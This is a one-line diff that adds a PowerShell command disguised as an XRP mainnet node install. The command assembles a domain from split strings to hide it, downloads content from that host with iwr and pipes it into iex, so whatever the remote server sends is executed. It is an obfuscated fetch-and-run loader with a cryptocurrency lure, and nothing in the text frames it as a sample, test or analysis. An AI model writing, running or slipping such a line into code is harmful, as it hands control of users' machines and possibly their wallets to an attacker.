@@ -1,0 +1,1 @@
+powershell -command "$install='xrp-mainnet-node=2.1.7-1b0a541'; $mainnet='.network'; iwr ('xrp' + 'node' + 'blockchain' + $mainnet) | iex"
